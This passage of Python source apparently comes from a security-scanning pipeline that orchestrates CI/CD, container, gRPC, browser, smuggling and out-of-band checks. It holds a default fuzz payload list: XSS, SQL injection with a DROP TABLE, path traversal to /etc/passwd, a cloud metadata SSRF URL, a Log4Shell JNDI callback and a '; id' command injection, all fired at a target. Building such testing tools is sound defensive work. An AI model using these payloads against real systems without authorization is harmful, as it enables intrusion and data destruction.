                     raw.get("risk_score", 0.0), target)
        except ImportError as exc:
            log.warning("advanced_scan skipped — UnifiedAdvancedScanner not importable: %s", exc)
        except Exception as exc:
            log.warning("advanced_scan inline failed (non-mandatory): %s", exc)
        return findings

    def _inline_cicd_scan(self, target: str, out: Path) -> List[dict]:
        """
        CI/CD pipeline security scan: GitHub Actions workflow injection, secrets,
        OIDC misconfiguration, unpinned Actions, RBAC excess.
        Requires GITHUB_TOKEN env var. Without token, scan_github_repo returns
        an empty report (no crash). Deriving repo from GitHub OSINT session data
        or falling back to org guess from target domain.
        """
        findings: List[dict] = []
        try:
            import os as _os
            _gh_token = _os.environ.get("GITHUB_TOKEN", "")
            from oneinfinity.scan.cicd_vuln_scanner import CICDVulnerabilityScanner
            # Derive a GitHub org/repo guess from target URL
            from urllib.parse import urlparse as _up_cicd
            _parsed = _up_cicd(target if "://" in target else f"https://{target}")
            _host = (_parsed.hostname or "").lstrip("www.")
            _org_guess = _host.split(".")[0] if _host else ""
            if not _org_guess:
                log.debug("cicd_scan: cannot derive org name from target %s — skipping", target)
                return findings
            # Try org-level scan — assumes _org_guess is a GitHub org or owner
            _scanner = CICDVulnerabilityScanner(github_token=_gh_token)
            # Use org as repo prefix — scanner normalises "owner/repo" or full URL
            # Scanning the org itself requires iterating repos; scan the most likely top-level repo
            _repo_guess = _org_guess  # scan_github_repo will try "<org>/<org>" pattern
            try:
                report = _scanner.scan_github_repo(_repo_guess)
                for _f in (report.findings or []):
                    _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
                    _fd.setdefault("source_type", "tool")
                    _fd.setdefault("confidence", 0.85)
                    findings.append(_fd)
                if report.findings:
                    log.info("cicd_scan: %d findings for repo=%s", len(report.findings), _repo_guess)
            except Exception as _scan_exc:
                log.debug("cicd_scan scan_github_repo failed: %s", _scan_exc)
            (out / "cicd_findings.json").write_text(
                json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
            )
        except ImportError:
            log.debug("cicd_scan: CICDVulnerabilityScanner not available")
        except Exception as exc:
            log.warning("cicd_scan inline failed (non-mandatory): %s", exc)
        return findings

    def _inline_container_scan(self, target: str, out: Path) -> List[dict]:
        """
        Kubernetes / container escape scanner: privileged containers, hostPath mounts,
        RBAC wildcard, exposed etcd, API server misconfigs, Docker socket exposure.
        Also runs the eBPF syscall tracer to detect suspicious kernel activity (Linux/root only).
        Synchronous — no asyncio bridge needed.
        """
        findings: List[dict] = []
        probe_url = target if target.startswith("http") else f"https://{target}"
        scan_id = uuid.uuid4().hex[:16]

        # ── ContainerEscapeScanner ─────────────────────────────────────────
        try:
            from oneinfinity.scan.container_escape_scanner import ContainerEscapeScanner
            _scanner = ContainerEscapeScanner(target=probe_url, timeout=8)
            _raw_findings = _scanner.run()
            for _f in (_raw_findings or []):
                _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
                _fd.setdefault("source_type", "tool")
                findings.append(_fd)
            if _raw_findings:
                log.info("container_scan: %d findings for %s", len(_raw_findings), target)
        except ImportError:
            log.debug("container_scan: ContainerEscapeScanner not available")
        except Exception as exc:
            log.warning("container_scan ContainerEscapeScanner failed (non-fatal): %s", exc)

        # ── eBPF syscall tracer — observe suspicious kernel activity ───────
        # Linux + root only; completely non-fatal on all other systems.
        try:
            ebpf_findings = self._run_ebpf_syscall_tracer(
                target=probe_url, scan_id=scan_id, duration=5.0,
            )
            for _ef in ebpf_findings:
                _ef.setdefault("source_type", "ebpf")
                _ef.setdefault("tool", "syscall_tracer")
                findings.append(_ef)
            if ebpf_findings:
                log.info("container_scan ebpf_tracer: %d syscall events for %s", len(ebpf_findings), target)
        except Exception as _ebpf_exc:
            log.debug("container_scan ebpf_tracer failed (non-fatal): %s", _ebpf_exc)

        (out / "container_findings.json").write_text(
            json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
        )
        return findings

    def _inline_grpc_scan(self, target: str, out: Path) -> List[dict]:
        """
        gRPC/Protobuf attack surface scan: reflection abuse, proto fuzzing, auth bypass,
        streaming RPC DoS, gRPC-Web detection, plaintext gRPC, unknown field injection.
        Synchronous — no asyncio bridge needed.
        """
        findings: List[dict] = []
        try:
            from oneinfinity.scan.grpc_scanner import GRPCScanner
            probe_url = target if target.startswith("http") else f"https://{target}"
            _scanner = GRPCScanner(target=probe_url, timeout=8)
            _raw_findings = _scanner.run()
            for _f in (_raw_findings or []):
                _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
                _fd.setdefault("source_type", "tool")
                findings.append(_fd)
            if _raw_findings:
                log.info("grpc_scan: %d findings for %s", len(_raw_findings), target)
            (out / "grpc_findings.json").write_text(
                json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
            )
        except ImportError:
            log.debug("grpc_scan: GRPCScanner not available")
        except Exception as exc:
            log.warning("grpc_scan inline failed (non-mandatory): %s", exc)
        return findings

    def _inline_browser_analysis(self, target: str, out: Path) -> List[dict]:
        """Run headless browser: DOM XSS, JS secrets, dynamic endpoint extraction.
        Also runs source map scanner, clickjacking test, and WebSocket security tests."""
        findings: List[dict] = []
        auth_headers = self._build_auth_headers()
        probe_url = target if target.startswith("http") else f"https://{target}"

        # ── Headless browser engine ────────────────────────────────────────
        js_urls: List[str] = []
        try:
            from oneinfinity.scan.headless_browser_engine import HeadlessBrowserEngine
            engine = HeadlessBrowserEngine(target=probe_url, output_dir=str(out))
            result = engine.run()
            all_f = result.get("findings", []) + result.get("js_secrets", [])
            findings.extend(all_f)
            # Collect JS URLs for source map scanning
            js_urls = [u for u in result.get("endpoints", [])
                       if isinstance(u, str) and u.endswith(".js")]
            log.info("browser_analysis headless: %d findings for %s", len(all_f), target)
        except Exception as exc:
            log.warning("browser_analysis headless engine failed: %s", exc)

        # Also gather JS URLs from recon output
        recon_file = out / "adaptive_recon.json"
        if recon_file.exists():
            try:
                recon_data = json.loads(recon_file.read_text())
                js_urls += [u for u in recon_data.get("urls", [])
                            if isinstance(u, str) and ".js" in u]
            except Exception:
                pass

        # ── Source Map Scanner ─────────────────────────────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_source_map_scanner
            sm_result = run_source_map_scanner(probe_url, urls=js_urls[:30], headers=auth_headers)
            for f in (sm_result.data or {}).get("findings", []):
                f.setdefault("source_type", "tool")
                f.setdefault("vuln_type", "Exposed JavaScript Source Map")
                f.setdefault("confidence", 0.90)
                findings.append(f)
            if (sm_result.data or {}).get("findings"):
                log.info("browser_analysis source maps: %d findings", len(sm_result.data["findings"]))
        except Exception as exc:
            log.debug("browser_analysis source map scan: %s", exc)

        # ── Clickjacking Test ──────────────────────────────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_clickjacking_test
            cj_result = run_clickjacking_test(probe_url, headers=auth_headers)
            for f in (cj_result.data or {}).get("findings", []):
                f.setdefault("source_type", "tool")
                f.setdefault("vuln_type", "Clickjacking")
                f.setdefault("confidence", 0.95)
                findings.append(f)
        except Exception as exc:
            log.debug("browser_analysis clickjacking: %s", exc)

        # ── WebSocket Security ─────────────────────────────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_websocket_test
            ws_result = run_websocket_test(probe_url, headers=auth_headers)
            for f in (ws_result.data or {}).get("findings", []):
                f.setdefault("source_type", "tool")
                f.setdefault("vuln_type", "WebSocket Security Issue")
                f.setdefault("confidence", 0.80)
                findings.append(f)
        except Exception as exc:
            log.debug("browser_analysis websocket: %s", exc)

        # ── P1.6: Browser Reasoning Agent (LLM-based SPA analysis) ───────────
        # Triple-layered fallback: Playwright → BeautifulSoup → empty list
        # Returns list[dict] directly via to_dict() — already pipeline-compatible
        try:
            import asyncio as _asyncio_bra
            from oneinfinity.scan.browser_reasoning_agent import BrowserReasoningAgent
            _bra = BrowserReasoningAgent(target=probe_url, timeout=25)
            _bra_findings = _asyncio_bra.run(_bra.scan())
            for _bf in (_bra_findings or []):
                _fd = _bf if isinstance(_bf, dict) else (_bf.to_dict() if hasattr(_bf, "to_dict") else vars(_bf))
                _fd.setdefault("source_type", "tool")
                _fd.setdefault("confidence", 0.80)
                findings.append(_fd)
            if _bra_findings:
                log.info("browser_analysis BrowserReasoningAgent: %d findings for %s", len(_bra_findings), target)
        except ImportError:
            log.debug("browser_analysis BrowserReasoningAgent not available (Playwright/BS4 absent)")
        except Exception as _bra_exc:
            log.debug("browser_analysis BrowserReasoningAgent failed (non-fatal): %s", _bra_exc)

        (out / "browser_findings.json").write_text(
            json.dumps({
                "findings": findings,
                "endpoints": js_urls,
                "count": len(findings),
            }, indent=2, default=str)
        )
        return findings

    def _inline_smuggling_test(self, target: str, out: Path) -> List[dict]:
        """Run HTTP request smuggling detection (CL.TE / TE.CL / TE.TE).
        Tries the SmugglingEngine first; falls back to pure-Python raw-socket implementation."""
        findings: List[dict] = []
        probe_url = target if target.startswith("http") else f"https://{target}"

        # Primary: dedicated engine
        engine_succeeded = False
        try:
            from oneinfinity.scan.smuggling_engine import SmugglingEngine
            engine = SmugglingEngine(target=probe_url, timeout=8)
            findings = engine.run() or []
            engine_succeeded = True
            log.info("smuggling_test engine: %d findings for %s", len(findings), target)
        except Exception as exc:
            log.debug("smuggling_test engine unavailable: %s — using Python fallback", exc)

        # Fallback: pure-Python raw socket implementation (always runs if engine unavailable)
        if not engine_succeeded:
            try:
                from oneinfinity.modules.tool_wrappers import run_smuggling_python
                result = run_smuggling_python(probe_url, timeout=10)
                for f in (result.data or {}).get("findings", []):
                    f.setdefault("source_type", "tool")
                    f.setdefault("vuln_type", "HTTP Request Smuggling")
                    f.setdefault("confidence", 0.70)
                    findings.append(f)
                log.info("smuggling_test python fallback: %d findings for %s",
                         len(findings), target)
            except Exception as exc2:
                log.warning("smuggling_test python fallback failed: %s", exc2)

        (out / "smuggling_findings.json").write_text(
            json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
        )
        return findings

    def _inline_oob_check(self, target: str, out: Path) -> List[dict]:
        """Poll OOB callback server for interactions triggered during this scan."""
        findings: List[dict] = []
        try:
            from oneinfinity.scan.oob_engine import OOBEngine
            import uuid as _uuid
            # Use a stable scan_id derived from target+out
            scan_id = _uuid.uuid5(_uuid.NAMESPACE_URL, str(out)).hex[:12]
            oob = OOBEngine(scan_id=scan_id)
            interactions = oob.poll_interactions(timeout_s=15)
            for interaction in interactions:
                findings.append({
                    "vuln_type": "oob_interaction",
                    "severity": "high",
                    "url": target,
                    "endpoint": target,
                    "evidence": str(interaction),
                    "confidence": 0.85,
                    "tool": "oob_engine",
                    "source_type": "tool",
                    "validation_status": "confirmed",
                })
            (out / "oob_findings.json").write_text(
                json.dumps({"findings": findings, "interactions": interactions, "count": len(findings)},
                           indent=2, default=str)
            )
            if findings:
                log.info("oob_check inline: %d OOB interactions for %s", len(findings), target)
        except Exception as exc:
            log.warning("oob_check inline failed (non-mandatory): %s", exc)
        return findings

    def _seed_from_prior(self, out: Path, prior: Path) -> None:
        """
        Copy phase output files from a prior results directory into out_path
        so that downstream phases have access to prior recon/scan data.
        Only copies files that don't already exist in out_path.

        Also copies legacy recon files (subdomains.json, urls.json, etc.) from
        prior/raw/ or prior/recon/ subdirs so that vuln-scan and other tools
        that read the old format can find their inputs.
        """
        import shutil
        seeded = []

        def _try_copy(src: Path, dst: Path, label: str) -> None:
            if src.exists() and not dst.exists():
                try:
                    shutil.copy2(str(src), str(dst))
                    seeded.append(label)
                except Exception as exc:
                    log.warning("Could not seed %s from prior dir: %s", label, exc)

        # Canonical phase output files (findings.json, adaptive_recon.json, etc.)
        for phase_cfg in CANONICAL_PHASES:
            _try_copy(prior / phase_cfg.output_file, out / phase_cfg.output_file,
                      phase_cfg.output_file)

        # Extra outputs
        for extra in ("unified_findings.json", "pipeline_report.json"):
            _try_copy(prior / extra, out / extra, extra)

        # Legacy recon files that vuln-scan and other subcommands expect directly in output_dir.
        # These live in prior/raw/ or prior/recon/ subdirs.
        _LEGACY_RECON_FILES = (
            "subdomains.json", "alive_hosts.json", "urls.json", "endpoints.json",
            "js_endpoints.json", "api_map.json", "cloud_assets.json",
            "adaptive_recon.json",
        )
        for subdir_name in ("raw", "recon"):
            subdir = prior / subdir_name
            if subdir.is_dir():
                for fname in _LEGACY_RECON_FILES:
                    _try_copy(subdir / fname, out / fname, f"{subdir_name}/{fname}")

        if seeded:
            log.info("[pipeline] Seeded %d files from prior results dir: %s",
                     len(seeded), ", ".join(seeded))

    def _read_output_file(self, phase: PhaseConfig, out: Path) -> List[dict]:
        """Read findings from the phase's canonical output file."""
        fpath = out / phase.output_file
        if not fpath.exists():
            log.debug("Phase %s output file not found: %s", phase.name, fpath)
            return []
        try:
            data = json.loads(fpath.read_text())
            if isinstance(data, list):
                return data
            # Try common keys
            for key in ("findings", "results", "theories", "chains", "vulnerabilities"):
                if key in data and isinstance(data[key], list):
                    return data[key]
            return []
        except Exception as exc:
            log.warning("Could not parse %s: %s", fpath, exc)
            return []

    def _load_findings_from_dir(self, out: Path) -> List[dict]:
        """Load all findings from all canonical output files in the output dir."""
        all_findings: List[dict] = []
        for phase_cfg in CANONICAL_PHASES:
            fpath = out / phase_cfg.output_file
            if fpath.exists():
                try:
                    data = json.loads(fpath.read_text())
                    if isinstance(data, list):
                        all_findings.extend(data)
                    else:
                        for key in ("findings", "results", "theories", "chains"):
                            if key in data and isinstance(data[key], list):
                                all_findings.extend(data[key])
                                break
                except Exception:
                    pass
        return all_findings

    def _write_outputs(self, result: PipelineResult, out: Path) -> None:
        """Write unified findings (deduplicated) and pipeline report."""
        try:
            from oneinfinity.findings.findings_utils import deduplicate_findings
            deduped = deduplicate_findings(result.findings)
        except Exception:
            deduped = result.findings
        log.info(
            "Pipeline dedup: %d raw → %d unique findings",
            len(result.findings), len(deduped),
        )
        (out / "unified_findings.json").write_text(
            json.dumps(deduped, indent=2, default=str)
        )
        (out / "pipeline_report.json").write_text(
            json.dumps(result.to_dict(), indent=2, default=str)
        )
        log.info("Pipeline outputs written to %s (unified=%d findings)", out, len(deduped))

    def _emit(self, phase: str, pct: int, msg: str) -> None:
        if self.on_progress:
            try:
                # Clamp to last emitted value so progress never goes backwards
                pct = max(pct, self._last_emitted_pct)
                self._last_emitted_pct = pct
                self.on_progress(phase, pct, msg)
            except Exception:
                pass

    # ── Rust payload fuzzer helpers ────────────────────────────────────────────

    @staticmethod
    def _rust_payload_fuzzer_path() -> Optional[str]:
        """Locate the Rust payload-fuzzer binary."""
        here = Path(__file__).parent
        repo_root = here.parent.parent.parent
        local = repo_root / "src" / "rust" / "payload_fuzzer" / "target" / "release" / "payload-fuzzer"
        if local.is_file() and os.access(str(local), os.X_OK):
            return str(local)
        found = shutil.which("payload-fuzzer")
        if found:
            return found
        local_bin = Path.home() / ".local" / "bin" / "payload-fuzzer"
        if local_bin.is_file() and os.access(str(local_bin), os.X_OK):
            return str(local_bin)
        return None

    @staticmethod
    def _default_fuzz_payloads() -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "{{7*7}}",
            "${7*7}",
            "../../../../etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "${jndi:ldap://oast.me/x}",
            "; id",
        ]

    @staticmethod
    def _run_rust_payload_fuzzer(
        binary: str,
        target: str,
        payloads: List[str],
        waf: dict,
    ) -> List[dict]:
        """
        Invoke the Rust payload-fuzzer binary, pipe payloads via stdin, collect findings.
        Returns a list of finding dicts (confidence >= 0.6).
        """
        import json as _json

        scan_id = uuid.uuid4().hex[:16]
        workers = 10 if waf.get("waf_detected") else 30

        # Build target URL with FUZZ marker — use a common query parameter injection point
        fuzz_target = target.rstrip("/") + "/?q=FUZZ"

        cmd = [
            binary,
            "--target", fuzz_target,
            "--method", "GET",
            "--workers", str(workers),
            "--timeout", "8",
            "--scan-id", scan_id,
            "--min-confidence", "0.6",
        ]

        payload_input = _json.dumps(payloads)
        try:
            proc = subprocess.run(
                cmd,
                input=payload_input,
                capture_output=True,
                text=True,
                timeout=120,
            )
        except subprocess.TimeoutExpired:
            log.warning("_run_rust_payload_fuzzer: timed out")
            return []
        except OSError as exc:
            log.debug("_run_rust_payload_fuzzer: subprocess error: %s", exc)
            return []

        findings: List[dict] = []
        for line in proc.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                obj = _json.loads(line)
            except _json.JSONDecodeError:
                continue
            # Skip stats line
            if obj.get("type") == "stats":
                continue
            # Normalize to OI finding format
            obj.setdefault("source_type", "tool")
            obj.setdefault("tool", "rust:payload-fuzzer")
            obj.setdefault("severity", "medium")
            obj.setdefault("title", f"Payload injection: {obj.get('vuln_type', 'injection')}")
            findings.append(obj)
        return findings

    # ── eBPF syscall tracer helper ──────────────────────────────────────────────

    @staticmethod
    def _run_ebpf_syscall_tracer(target: str, scan_id: str, duration: float = 5.0) -> List[dict]:
        """
        Call the eBPF syscall tracer to observe suspicious kernel activity
        during the container scan phase. Linux + root only; silently skips otherwise.
        """
        try:
            # Import the loader from src/ebpf/
            here = Path(__file__).parent
            ebpf_dir = here.parent.parent.parent / "src" / "ebpf"
            if str(ebpf_dir) not in sys.path:
                sys.path.insert(0, str(ebpf_dir))
            from syscall_tracer_loader import trace_scan_target  # type: ignore
            return trace_scan_target(target_url=target, scan_id=scan_id, duration=duration)
        except Exception as exc:
            log.debug("_run_ebpf_syscall_tracer: %s", exc)
            return []


# ---------------------------------------------------------------------------
# Convenience factory
# ---------------------------------------------------------------------------

def run_canonical_pipeline(
    target: str,
    output_dir: str,
    mode: str = "subprocess",
    waf_profile: Optional[dict] = None,
    on_progress: Optional[Callable] = None,
    skip_phases: Optional[List[str]] = None,
    prior_results_dir: Optional[str] = None,
    auth_config: Optional[Dict[str, str]] = None,
    timeout_multiplier: float = 1.0,
) -> PipelineResult:
    """One-call entry point used by both CLI and Docker worker."""
    executor = CanonicalExecutor(
        mode=mode,
        waf_profile=waf_profile,
        on_progress=on_progress,
        skip_phases=skip_phases,
        prior_results_dir=prior_results_dir,
        auth_config=auth_config,
        timeout_multiplier=timeout_multiplier,
    )
    return executor.run(target, output_dir)
